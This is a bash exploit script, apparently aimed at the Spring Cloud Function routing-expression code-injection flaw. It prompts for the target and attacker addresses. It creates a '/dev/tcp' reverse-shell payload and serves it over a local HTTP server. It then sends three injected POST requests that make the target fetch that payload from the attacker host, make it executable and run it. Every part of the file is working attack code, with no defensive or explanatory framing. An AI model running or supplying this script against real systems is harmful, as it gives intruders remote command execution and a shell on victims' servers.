#!/bin/bash

echo "A payload file will be created in your current directory"

echo "Do not forget to set up netcat listening on port 1984!"

read -p "Target IP Address: " IP

read -p "Set the Target's port: " PORT

read -p "Your IP Address: " L_IP

echo "/bin/bash -i >& /dev/tcp/$L_IP/1984 0>&1" > ./spring-payload.sh

python3 -m http.server 8000 1>/dev/null &

sleep 3

curl -X POST "http://$IP:$PORT/functionRouter" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"curl http://$L_IP:8000/spring-payload.sh -o /dev/shm/payload.sh\")" --data-raw "poc" 1>/dev/null

sleep 2

curl -X POST "http://$IP:$PORT/functionRouter" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"chmod +x /dev/shm/payload.sh\")" --data-raw "poc" 1>/dev/null

sleep 2

curl -X POST "http://$IP:$PORT/functionRouter" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"/bin/bash /dev/shm/payload.sh\")" --data-raw "poc" 1>/dev/null

sleep 1

pkill python

echo "You got the Shell!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
